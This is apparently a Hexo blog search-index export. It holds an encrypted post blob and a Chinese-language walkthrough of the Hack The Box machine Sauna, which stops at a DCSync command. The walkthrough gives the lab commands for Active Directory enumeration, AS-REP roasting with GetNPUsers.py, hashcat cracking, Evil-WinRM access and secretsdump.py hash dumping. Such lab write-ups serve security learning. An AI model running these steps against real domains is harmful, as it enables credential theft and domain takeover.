f62a033c95fd16115c084c5cc5ede545292c1be0c565b3eec33f63e14e125f9072628b9646d7a9f713fb1f02152a70c8e09bd0930d7f466c64ea8c788f46e7649e4aae18c7cd98600edfd184a64e01c2a055070ebaef16e1177240153d40297bfb4ebaef1f368d0bb093b6dbe01e78b15a2bacddcbee83c862b28585c26e6bba654ab7e99ec10b327bf2cdf43fa6dfb8be2558d311bfed2d630fbf9d1dffb551bd719c54360af6ed448c60225d50785f5d0edf1d9e722c23aa3e9c410892a6bb077fe647227bfdf38129c6fc3f3a80f1d2cf2bd073136cb859cbfa6517d3fa864cbf4006a8bb160f717a075e8848ebb6cda199c37e130e7a93f9a733e01faa58145148bed4ea6754cf204e0ed81570d25f8ccc208f4f1a6e2fe3536958167670ea442f2aa4d95049957d1214c5d7496401c1462dd9db070299b7bfef35bca50d4794e41411da372abdea0ad00f203a6bea121f67325982c94c1499bf1e3b0e06ccc94ce4acd466264461dec8079bccc3bc8f4b42e9297bea039eff98a2e6a38937cca7f6ea345f3dbdc438d9b9fa39a5d8433290fa838b68a570adacf25f9a169acb567d26ea9f7f766045bb84fa95533617dbf63989c4925505e69bfeb7776c2130d7e4906240e9127e202d7919a89503c836088969f1fca882b4d8bf7a7d7d354b1943536d2d582a1a083e4c86a4ab581048014c1c754dff0416500052740177e048e68ad1516d11cf0841bea59f99f5d3188fedaca3c559d8de09ecaa52eafdb42254a9ec83b41ba930ff50f28b7c7fbfb0081da4131c34e81694c96673418eca1e478eb14a83ae2d2602c0c7ad3dcb60e8d75689fbe5f9fa4b4912ab3cc0db9b89859874f497916ca44d4584bf68ca91d46e61e78b493462f892e3c5879296bafa83aadd432bcd77b03cc2326f60b813ca9192e5585db7af693af50b99f6502e63f656e4c1e6e6a55cf72c448778b455d7f69c31ca3fbb420a23ecef62cd02a28763a83c2d283a4fd1c8f1310c3a472f84ae8d49da0181572048ea97ea46e0cd0235d8df1f805b6a14dc92c86f5d4ab2933059bb8b62026a1a07231734b1a54ea0f759df2fd8ec9d5485398ad47b0c91b1f887f0da75038adb39c87ff80f0b0fbbefa6ec2067541af4fe44e2bf9980a3144aebbf6618dc7ac2b7ab70df55d05b5172ad4e2b63dbdba6f8e8081c6f108efd415bfd4a0f2be998ac083abb4b9c9ec78ac07ca9cb24020b58887649e1dd6078091b0fd2ead3d418d4414b8cf2623b9b1b97f80a247b986c856e5007b1b3a5abb3e1b97517690c8285608959049a59552252801c3b284a24551556872fe2d6ba9eb4baaed0aa3546f1c8cca066e4043f41597908361c26cb9c80402cd697729ce0a0aedd522aaff849ee10942d0b85a8e8dc084eeae0a4d1ba912b3d833fb6268f3cc834567dffc2ae3f72404674d880a28a3cb4d3dbb58250f7c14637ffda8fdfef10da3954b9b222be397b194063194d93efb96fe98470dc08bdc9c4fd83d5beb4d5d25cac9b44a90f7e560d34d614d6097fda1adb605cb1421747fa4a83747b8873bf7be96853bbe89be378fdb2614f17bab2cc7266d299f57208303ae710aa842460b20b5182eb66452ba224239299d3e994581cf6052d257a20034f6b018a5fd1685d0be81a0b360e41061014f929c5e4ba1ff3461143fb703eb3edb2387043b5a56bfb83a2cca743e8e2a770c23dbf03c23caf3b14ce15695881e40a399008c1c99c3525927ff3017d5ed83ee502f596d97dde78e7f9f7a10f02f9df92642d12bcef85ca2cb2567044695bc46058b3f5c990972b9fcc0fe9da72934f118d09728c603ad88ff87a3cb3fad0ee172e2fbefa60cd05ff1025a027592bd509ee7ed613d4ee964dd5ff0e44ab7fd953c8ff3a08ebb488f02b6679e8be2a454a52e696394c932d5eb87e8513d0f761404a65bedeedd5327c4e10bdd8c15c350bc86d01a4378452f152a30f1ec33a1eb7410dcb41c8e15d0512e3fd234e10b2e611dbd501788dcfcdeca964cc30e2a4c85c276126b23eacbcbd7a9053d1f05ae21456e64d6e8048299ccc69feaa3bad4528689118402ff80e02819fa355e73f622bde493259db25c662dad520db2f58eef2cbf0b525130b0fd73f2ee78edc6b2e73dbef11c57d34562d821112d3df8fe38901c6f22ad2c888adf150a181589406eaccc8ea42405bfb094e321993b47dd16d02bb82cebb9a4f47cb3812f9e6197be46af493006c5d0ce5a7975ef9798b2500b37a835b473161bb2481dcf380c2af4b85655a76522f701b3615c56cb8f917c78b6eb4b3ff29d6afefa4ce112bd4cb34be85a594f504a93748c360f07994e4263921f22ce862d9a363c96e0d22de6daf29ac437ec1b90a958e05d04374cce93feed123556d10dc887214a3e1f268650ae0f622189bad26bc39e91a70efec150a082fde7ec9a85b54c32aefdebcfdf1ab633995a6c558ea46f2055f49d8a03a25904dcad8b934d9fc7bb9b9e850481c4648a4abfb79a09aaf2d5cb1ea1b43669f0398b738d390c433aa4a1ec4ed062b001420c37cb0d01d06c5963b062f600b4bd58c0531be7067370a78a8c6dbf5af791dd45b771813934e38faeb73d1a1091c70be17ec2a9135f52c077338d3f26deb14bc4d2d7e01c6262f2cd62ff5af0ce764762f6b6d19520de98a57fc26d3f594ded6c7c53119be530183d76e6363b7e5e1cddb0ea6414dff5765147704214c32060842587779bad8e290f72f1d1d7327b6d68e323149d71b89342eda86334a148221549adbf988967cf51d52f0e5eedb4d0a1c6f30189206466b25e6ce01da3a4bf671e9d207482c6b7f0098729f313405e8b40c34e695f8d5743c5bca0a3d9dda745b4e5d613a4c46e67cb4264691b79bea41c1534f934c06476e3131b50d61f4b51e03a61f65c5b8c67e4d259c918a4edfd79fe4ef2d5c6653a21e91a34bc4fa556d0a25215294dc75ff94d4cf0e715857d6349cc76678201ebe22b6389ddbb3345f30f4e56a1201d21ab6d9fb114429f8a7fb254496ad150667800ac315f8f3858212aa13606b1e7eee630fbb8f3ea3b1efa50177cdf730e572233ed46de06f5c663c03903df9ed98f416f7ac216218f40e3cbbfe328913eba30b33dbd770e71b6c9ef13efa4bb3c2b25b4d4c65ff2382523a5af9c7b47dac61356b85953f9e928eff355d367b05230c5225c1515f65d637d4767279d9f5257ccb5844283686c1297f8cf69ffc68f459b973a5989800308acf925ff33f631879e1e0bee837b9b7eff2f1ecccf4f8543235365c6e6fe1f844cc7e97f887ee2dce14b9cfd997dbb83bef7bce9f4d0ab72e5ad80103e4169d1c35ee825f31f99a153c9ea7c16846226ed67d05b12c47db442aa4e06cea76d0be5185fbb2c2ccf18c1bd44e0b16d62963311dd3ed77fb5ecbd3d34947849af99f3d940e21ec80205ef16227809071f4c03ba81c61e0c7fc45db00b0b11eac3f2b1c650e7db2eea9a60ea83eb03bc5b0243971067c644f65c3d03a7c41b5e3eacf33e9c0464ca1c5a92aac80138603a6c57b8fa968cf0a84dbafac7154739bd6a343aa7b15c470b4822bc17ff51a7ec702cd3863472092dfe4bc5f7c6667b9c29e37a564c1965fe5fa1b8162fd305fe49244beee2dc553f3b8a44c480435fc30eab51174e892531264b7387595584579f923e83a8e8698cd916c05e8095fd10d019180a18e317cc05eb2c1c87d197654fe1f0d4da9ccb2187d075a76747fdf064c8ddef5b2032e0eda5537bfa22479aa093ac7a4f90d96839dbb896ef906d5ca49ad502f4f874d40c93506fe69b76ad5d36fd2810d5e50c60be8506bbd3bb4b4dccaa6fdcfbf2e6a4b71279c66a3769ee36d6b16eec2d3a458d3c72d55603ecee8aad0f9c97a90efc9cda8e3ae69acedd8223d396abdf04accf2b45705bd66e24fbaaf397b306e0702b94b7c54b7e445faeceaea9cdfb846627794e0723d873b73223548a362353b7f8bef9a76600e3f1ec9bbb3e59705f4c2d3e5c9153f6c8fe4ab03192edb7ce0e95f38283b595d356f339f657649797901e2feb4c03dc7d7b89145a80d2c139bc7503cc90d25b807ad4284fc46124f14a77169b98e043e42c493f5ea803b80e70cf0c9a96e668dc603591df60250adb979202b797dc1e82d5e249da5c305eff93387100552d9cca5d960cc90d439e2345ff8df46a194832c3cda7cc1d52f1fe85f0dc13841cab9af32fe912d42878674459e49d016e16b97469e0da63a331283f3d63333e3bca150072a2b49248b3a5b5093a9bf6ea4884a876bacadeb7c501709c107e3b354d70f4649cc0ec7d671b319a1af3bb1a4672225d1b25369f00de932520998f5bd720ad10580002129c4891a321a61963b7e59025ea925d7f5bffa9de7db9da59f5598e695903fbd89a785f492237f1d4068ea5b412d126dc69da1d5f4a66633266bf1853d90b14578309fe42e3e99befceeeb244556ea6b15ca22316b882c981ceac6b8c22cf70457b82be2aaabea8fa71bf011ae812fcca48ef0f6e29ea2202f688ca3a2fb7804d897b753e0ded08989ce66b316ee509fd823dc3d5e65a45ad05a7b9f036eb68777cedfa88af5b736701b1c9842cbd1d2bea2b0145c4968bf3e18726bc45f0e4b2f066132b86af89fa8330bd014ec42a26ae2bc72037c383db99821c9405f2edc51727907e231638cf121ea13e62814dca01f80210668f4fc814907acf3e1baa71e1a16b08ac70e83beca878b2e60d4944f1175b52d90dee423f8d0137ae6f27ab975a84c1e72dbedcec2ba2bb02c186349d350d739486cba135164478216aaabef3cb8559d3ce86f8f6b41b7f902fcaf86458201266c6e1c808e9ce8ef0daf15aa3dd28766e85b975919090d70da5de0555487d654aa9a514e9959adf853328f2305a66979e331d871cb9905afd84a4d514d7dacc88ef33f7d1e19537e26e0fea7c6acc384713f66b98add5375f46c39a6d50575ac22a637cdbfaf19ea68ed3f5a680bd7f69a7b602c18ffb6f8c1a907d6483232334a4778dc824e7a3569b1fbaf19faafb6fd30b8bfb4e7c840ba14f759f90d43425d661264eb86b9275e6019cc298b034c259302f7877bf5752aeb74a16f7f8e0f40cf6859c790f515efca8e24f53c5be733803294507c80171bc14fa94cb2ba4ec7d1851be6e67b93d868229d7225560bec2c0da125ee8d8455bbacc2e6549565d78da3ae7011c0d74203fd74ce57bcb58c728877c7910c3005bfcd9bc3aaa8d22c4f8548fe25fbd380d617235fe01e166c34b6bcbaf31dfdec4f16de35609ab955495197795177d452016212ba1ee160973daa60384439118e5119e43a8d197ee154128d7827e882abf2abe59f71d413b4ef286b46b95a6cf0c9df8c855d256440c20ae46750d3eec1eba8a1b7b641c46e0b7542675c044e55a638c3b4e48c0e621916673b238a2a69932fac037e577b985d092eabaed9e47b05874404f793f04506329968ea32c71bbd7e6bc8a0addf34b0babcc8e02c35cdf6c92e67dc79d4f08bcd114d95ea3d7bf63a263831bf6a5b014232d368540a78e3d46cd367c41eca703f0a5c220e203871955a8c57b862c298d30032c2e1f354d81b4a6f1958c3428c65a39b4b14a72c0f0e6084a2384e1c5ff59a6778797c0028c735248078bf2dc2beb17e0ac54ba69610b9b37afa983f26bc2ee519f04322d7cf4b17686de57f42f202845ba0d5caab002dacfe671cfbc65ab3626dd3a55f8e538fbe2091ecf12262db8b8ed74e7de97cb1a8fef8ffd1ece9c01e95759426254f428a3d060f9f9f8fcdf023078370362b588bb498ff5433eb0b7f36d322dc8492f4acd4c7a0072d254f8bde1195e3ceda283eac93d66c85648e3dc125ef7c52e95846d692a5dba85eabb1d7c3e58c4d67bb368c0013fbc00047c6deae4dedbceab8375e1b70ae5929d825596df51407728f8e60efe6f17f521d6a450889d39d0e980d01d4b973f133a247564da6fdc398da5e9014407edd6a88492e052d88cb5f89af837854ab88417599fccdfdc205c5c28fd731e4b2745a29078f5e4c4ba11108fd257727b2f1a23b00f5b1e0aafe280dd21f4ac655995195f8619166b6c5e06854c09aef292622c0ed8076c3088232b2b4bf3d85a06019315156a0eb1ec95f902763a2ff237328326d23559767c66083d34cf44953fec6db5df9c7877af058e739417bdd67dc34b3b5bb02a9969bd9952500c9e87eca1a62cb443809676e5a59626f75705d05ecde832843c2eb818c7526a3f9d26b60a8c144951e3492ff83c3d0e9ba002bc6ea192a00ad8e6716bec520ea2bab93a142dac7e73f0a89792d01e36d5d228a02588249279a0fefeec245f45d755694c8cebb69ace444b8264b3223e5f75708305d2a831320a6a31020b5b6e361d49953b9b6e96bcbbb98cdbfa6c74ef5dd2aa77eaeb5c871f31505aa42e73f7b5b4ccd8ff4261d3ed3a3d97508b508db7d03c6ba1ffe17e4a3c55d73a8c3d8249d73839ec9538ea77990309aff4ef9df82b97967d004bde4ff4ea7354b95dac851341fdddc3ee5e73071f66afe559e6e25cda1c758e80d61b88e9b0a2281314712e679da7dcdd4ffacc5d6fd53b9eeb8555980f7c5a28c15ae47785a1fcb8e17bd79650b41461cf02e1f514f2941c55332d3b537cc223c3b455398a6e7c51a10314734f31df7f0b4f40de4ad1172f842a05b87b27d651430996d7a010f90f88ec3e56f1e9ca5ff4e5fae14aab9dd4fd463f0d19920a18ce71f861ec83a2d415c057363a125767410528335565d39957f3ba095bf0ffd76f459894f9274eff390d1209949fb1fb54b831b39565af5b2a4ff15cd020099fabe3c17103bd16ce0394086225dffefa0f6baca15f5dc170e1c5133fe91e58178cfa4f9e224909e6d181866f99ffbf9e8cfd307b6ca48f75d69185093827da6a273783b517b9ce1f9b111c2c94a531e44f930ef6cb9a86b039d5f84d84c8a794bba85ea69103b1d1091db2e23fd28b4be15db29037f95e66b934a5a8efc682bf95b9086f30db2ec53c630e7eaf6492447fab29f61c077ef23741066c799eb59e16dd3ed773a513ec863c5c074ed3f5e4b0685bb38bdc6985699d2095d35566de4fde7d469191603a8527c2ba1e43f5bf66f42fbdd01364b8bdd505bab761bb59e33c0d4cae6153af7a46b917cc6ef7bcbd14d6fa25f35ac12a36d9d429e8767fbc5cba0eff845a759587d07d33a6330311519d5749908d174b3af98aa98bbd1ea2997479fa1ba78fcb059d66bb7ee33217475e2fee6f09482127306b3fc887fa2234e2805c0c1ffd2a189b030b0d4a3c255b3bb5cedd9cf804a9b8a1384c6a078aae0bd869d686ff22fef0365916782872902c28ea4ff193536f60139475aaf8162653ea1e1eb843204b4b437e64edf0a01bfe59cacd9697719122a57cb10ec2465317c29109e1128e11866ba2bff4de1a586318533139f4988f34bccdc5a3532ca6d3b114ca363bd4bda76e4694fe318bfa6ee11fbd8ee3d72995ecbecfb43a30b747b0e174c5972a9f752d28454970a23c9a69be356ac57188fcedf4387bb882889f35157aaf0a695a0cc363fa41aac749ca9e134682570145894922b974609a7d2c8641c397eb028f2190fccff983e8b93c6c2e8e3f621f903ebc8d2881656dafca1018380cfd62ce9e97be958c1bf1d226d218e08d776d3bbd65e307cb7ad3b7904bc0d8334a1a97aeb5b19993b0aa450d8358a98b0010610fa38ad545f1576fcba1563467a13da70b6dc5bf33ee1bb43b6951aca6b74f79e1d6310f125bf0c5a454964bc455682055fa2bdbe9c374c6e502ba7dfd3bf1861f23de6bc6d31d205fd749381d59b278ff37e640929d029304aa0c05b1c132c7c0a2b48a0c0a810a80c30e5fd09d484f2fef95b441366b241edcc7b6b16874c1ef532427969ce870503bc8e68bc7beb6415239f5c99b8820f1b771d2f411110f1b25056591639b59afe368d80eb931015c53cb57113161a3f7909f55beb645b3113ce8ef69387f795b5360ba7f09c29bb060752485fd1ecb59d1d27b0de52292e163678ea3beae8f97fb55ea19688671a90d8e0ddfa0da931b43306dcf149f8eee6a221bf31701fa060dc8fb5de059c175f840c81e9b8116a1c249e940552c1b886253ac9fb42ec07c39c633dbabebf69d28425e55e05b66eeaef84b00434dd217ac1e7d2e741cf2d01fa16205fe839e185d2e9df1adda2140ef80cbdd3f5d89a896af9543f2d9a8de07ca0911cd920d5e668eb69a0f580ea77561138342e39b090b618c72ab8fae8942c41af7d095c899175d7ca447cebf65d73d4d55033bddfb949936bfd8c06d65fe92c77b31a624e37ea94acda24c1118ee41e93bced6efbd2c828b7fa71709a98678d40ed3d16aae01f64cbf5534bf378a7326f5fcbcbe5bb5a5ebb6b684a20e2ddc81e015905bc83041597718cfdf2575b47249ab515379fd7ae9565be6e80a8b2678ab962f7c92a5175456c2b1b0c23bd6ac4fcf70ed4df809ae077e4128088d5c80e00d98d6e879d6ccc808ef691561457e033181825769c52472e9de4079371b0780ae4595864aaf7b7af3ffb009f63fe87242f1ac9f9e526bbf38bc4681c428338fd6bc6921fd717db75f8d7f7e860f7e351bfaa24115ba410bd1909fa78c7140b56b92240c9d42844c1af2a3f578cf0841c0d24bec93fd4f421e8b490a1a84895316873df9fcc88c7e20cce3a89859b69e0b8e47acf1cc243fd5229939139cc1f6972c343c76150260be26672ebd8b24a5442eab6da0501cb7562c2522b9ac4fd73abc6585c39227904c029bbc3ea0c431c0c67b073d2eb2a7d4fc06a47a4fc723f2e3db4c5139c77370b7ddb0ff6c985dbbb82f5a5eb35dbdc2ea392ffb0131b98fc4642756fd0301c8c9f4748e72c147c86434c0b72cd5716d7615f33290eeffac08981f43ec83a4215620d13d2c8129e2c49d11427d1a09fca15340cde064177566abef1691a418340279112f1a01af3fc1370e4d8916f6cb6d4281aefad87c8b155b605f201bb1f6fe50baa3e1de503b827456ee3dfb5567f210a4df5e6beaf52a31ee32627acf9b9929a0ad3021b974c87cc66c2d9581b04c7a8972c8899acc1fe3ac61024dc71935b23162a770a22661a46e43bcd1ff16a5ea9222acfa738ec2cf2c3a19cffa5fa7193111d59f84957bbe37a27226100872f3c896398eedaed8d918d0a281b4cc33938fb93f99fc6a1fae22f0e821358d1364fc41bf05d5647a3f606f7d4bb1c35f9e0348c29d5e948bdfad693e0dc5e4fb0e9ad03e3f9110b669b94d618d8d0166383650ac67983e70966e2adaefc6c2f516f89ee0b5602ea028060cef6e92f2116566257bfaae73800a048cb9035c73ed554d13dc168cd6a9444c38c3ceb183a6e2b4fb2917cc3329c3bf5341f0b4eb6fc4cbabf95071f369949922269222d9f91f0a541375eb25d3a8a02176dfd21dae618073c1e7c2440ab164bc96a5363febcdf69425e78c599f11907e3ac3d64d6ea09689dfce1996a890cd9489e41fa3c4fabd8d369a24dd295e080a54c1959ac04263ddac83174c803310df00fafad7fdcbaef0493e59d762c193c934591865e3cab61c63e667a39189a10111dba461acbd96046af094df9540b1d069dd56edabbd66cf05f56af61f8163ec34ff1943f855d774e8c9254c7749fd8b24bc28805dda9b01a319593c85c170b6ecb663a6afd84b5003c378e51965e138ab8471c1ec4d2fdf3fc8ca3427567f9089db8e5750d77d2dadf1bbab0b8ae64a241a18a670a2ef1fa5ef8bc75a84b995d95921744057a8b27dc8723aa1fdfdcc5456a609b0224a6828a6c511d48f85e3db9a546711e646e8198e16deedcba64b8d2ad7e6c2f28d89b2bc2918e851925e698899e15030bfe7f9e26b10d5877ae37e9b9a6850b236802bc7fc8bdebd57441b82ec218381e4c5a02a8fd62fbad036bb6cf7d518249f6e97e0da53194339b196f0705f172cec0997269eac9051830e56b1922892ee5ed4f34e576d97563e61478e60d1de8e53df5308a6f97f79ea82c5ac13d3434fd80a67f2f6d5720f712ac7224920f381c655e03f2675044fbc2e0dc38bb94b3f97ef5e23696e23d0cb0f0e26fd8565bc24b05c8542b17a17c214a950007afa26b4e5d8d4180098f98bf3b6873f95fd5de8181bfa3ce7ccc387e6af206517a9159e3ccce0ac6ac8f93849d9bbfbc12a901dd07714b1b1f2a73063cf596ad96f5eec61fdc1ba9b74446656eeae34c57da856af6b4f827f5d6ac3bc64cd4192b110236687b0fcb0bf1c65693b111020762ca50abb7ae1bb33e0b57a645a42b35f28f79a044ec9acdaad8107c4201167732d8255ffb13be64e1905f73f3d8b5376cdc1230767191c2be6947a20b1f03c5210b57b01892ca79d50c7a6f6898a2a4f093c96d085e911948782c57337f4f22697c31f9338f03f85272224c7d52ebe9c45425980b98a98eba6031d85aa2fac1370b66be6984d91f462127c708903e14dfa4371d7b1076323f5b9b8dbba3777cc7dfb7707e482ca71800439a04fb7c123b139a4d3f3343527a432fca922d5ae201e61bc7884555c69782a96f9772fff9d03cc3e1fff05653e3e18f74fd83b59b01d575e7fd1d2d9fe5d7e09873a05ff905389abb38e555e6573d2839f50d47fa773e09b07e47d36a0c45cc05d81a7146d283f2d57a9c895a3d7ea7cf46cf4237574ec43a714ceacc114f88ac999d712c17ac68d3e5d22f3a5293a1893c0342b209b3103fbc2a4fb472e69df2e3adfb647c69ce99703fbc455e85797cbd405187aae126ef97a3f543a917147842d306de0e5f43544ffe8bd26f7965bb19a2961bf46fce253697b6018d3647c55fc03cf73f695703ed417663b1acf894d814bec5f7e11bd17e9d728c992ca44b3fd03f16a8ecfcc8b52761644b7ee3aee58cabe9035dc561d4d2c95f252f7e46a3ee06ed0b4b7bd8593bc6dd954c37601fdbdc7ead7df07f7ab4314087c16c056528262dd860aa82470552eae06b29ae17a14db33fe46367415361b6f00bbc2840c27e513fd998c9788b97c97d4c4a0b64f8060e1f7e496c74af624062c0cd676ab90d9e869c40349637af8ba4e17b17cf0fc6e8ea2c4ac0934b4a34bd1e6808374c0cd76209b0f6d1721baf06588e2413b1e40dbbf0788d5c65ab7f6dba538b71e9fe37991b583a8c1097f0498350b5727ede91892272053f5a389abb90d0963343cae14d86aa4f5c236742aa152536c7e4b1a17263737bc65fa2ef2d99b4972283a932ee300cedb420dd2ec8f694aa0cabd9899db2104165af057a9cfe0dce8b37bd8fbc3ac4d8babd8a98b9eea607b312ada506791ee43c25105b27cdae8a6746e0024da977e47d30ae6b260551a7cd98d8bb6e9751c878864f6e9acadc9e1aee2078decd613dc9204d89fa95f6d0dca208f104246a9d5c4118fc57c890c771461638d4d8eb45d2806d9d57087587df6ca75fc380adf5449b810de5af39dde94465181e816617067a4eed15d4e6322b4c76dc3b38fbadb35a3043cdb2b775dad4db8c2514d1a68fc46f3fb895eb0effd246da3ce70c590fae04755d8dc0f64e67a8792844966d5595bf1e593a76e16a12cede224a2e50de90935bf4f4fb309f1cd7ab3ad63b40123eafe2c6d41016e3b01868f04c4215239b2a0c4fef10b83663b2b4b2ac5e33e0f375ad2891a6f3f5d1c26dd28b6059cc96d6121f77b68827a99a0017bc0171629a83d9af05da28bacac68f4845b2c2754df93fb97f0714d958c84717f8c7be8f84abbe20ba81359b662df0e5e0c63e503dde3213b040d842ea967cbb13d25dc68df03ec0a79911dbee38ff3ab359395</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/03/15/hello-world/</url>
    <content><![CDATA[<p>一个开始。</p>
]]></content>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>htb Sauna复盘</title>
    <url>/2024/04/09/htb-Sauna%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>继续记录学习📑</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p><a class="link"   href="http://111.229.75.150/2023/10/11/htb%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97-sauna%E5%86%85%E7%BD%91%E6%89%AB%E7%9B%B2%E7%AF%87/" >http://111.229.75.150/2023/10/11/htb%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97-sauna%E5%86%85%E7%BD%91%E6%89%AB%E7%9B%B2%E7%AF%87/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://m.freebuf.com/articles/network/286137.html" >https://m.freebuf.com/articles/network/286137.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_34801745/article/details/108136791" >https://blog.csdn.net/qq_34801745/article/details/108136791<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Sauna" >https://app.hackthebox.com/machines/Sauna<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：<strong>10.10.10.175</strong></p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>先扫端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.10.175</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184941.png"   style="zoom:30%;" >

<p>扫出来有很多个端口，有kerberos+ldap等，大概率是域控，域名：EGOTISTICAL-BANK.LOCAL0.</p>
<h5 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -L \\\\10.10.10.175 -N</span><br></pre></td></tr></table></figure>

<p>尝试smb匿名登陆，没发现什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409185909.png" ></p>
<h5 id="ldap枚举"><a href="#ldap枚举" class="headerlink" title="ldap枚举"></a>ldap枚举</h5><p>对于389的ladp服务，存在一个匿名绑定功能，通过这个功能可以不通过身份认证查询用户、组和计算机信息，我们尝试使用<a class="link"   href="https://github.com/ropnop/windapsearch" >windapsearch<i class="fas fa-external-link-alt"></i></a>看看能不能利用成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409190131.png" ></p>
<p>没有什么收获</p>
<h5 id="web端"><a href="#web端" class="headerlink" title="web端"></a>web端</h5><p>80端口有开放，可以访问到网页，提示是说有个about.html，里面有很多人名</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184647.png"   style="zoom:50%;" >

<p>收集起来建一个user.txt，然后用<a class="link"   href="https://github.com/urbanadventurer/username-anarchy" >username-anarchy<i class="fas fa-external-link-alt"></i></a>生成一个字典</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184624.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./username-anarchy --input-file user.txt --select-format first,flast,first.last,firstl &gt; unames.txt</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409190453.png" ></p>
<h5 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h5><p>用字典可以查看是否有用户不需要经过Kerberos预身份验证。如果存在那么我们就可以得到其密码hash</p>
<blockquote>
<p> Kerberos 预⾝份验证是⼀项安全功能，可防⽌密码猜测攻击。在某些情况下，应⽤程序需要为其服务帐⼾启⽤此设</p>
<p>置。当不强制执⾏预认证时，可以直接发送虚拟认证请求。域控制器的密钥分发中⼼，（KDC）将检查⾝份验证服务请求（AS-REQ），验证⽤⼾信息并返回加密的票证授予票证（TGT）。 TGT 包含使⽤相应帐⼾的 NTLM 哈希加密的材料（时间戳）。可以从中派⽣出哈希值，该哈希值可以受到离线暴⼒攻击以泄露明⽂密码。</p>
</blockquote>
<p>这里用到impacket的脚本GetNPUsers.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/kali/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile unames.txt  -outputfile hashes.asreproast -dc-ip 10.10.10.175</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191257.png" ></p>
<p>成功拿到一串hash，用hashcat爆破一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>

<p>拿到密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191433.png" ></p>
<p>拿账号密码用Evil-WinRM登陆，拿到第一个flag</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191657.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>上传一个winPEASany.exe，运行看看有什么可以提取的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2019.22.45.png" ></p>
<p>发现一串密码和一个新的用户svc_loanmgr，拿着这个再次登陆</p>
<p>用“net users svc_loanmgr”查看用户详细信息，发现是个Remote Management Users组</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2019.47.54.png"   style="zoom:50%;" >

<p>再看看这个组的情况，net localgroup “Remote Management Users”</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409195851.png" ></p>
<p>“ Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.”</p>
<p>该组成员具有远程管理系统的能力，权限达到管理，所以存在DCSync 攻击</p>
<blockquote>
<p>在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。</p>
<p>DCSync 是域渗透中经常会用到的技术，其被整合在了 Mimikatz 中。在 DCSync 功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。</p>
</blockquote>
<p>使用secretsdump.py脚本复制权限为所有域⽤⼾显⽰ NTLM 哈希值。运⾏以下命令来转储主域管理员的密码哈希</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/kali/impacket/examples/secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator</span><br></pre></td></tr></table></figure>

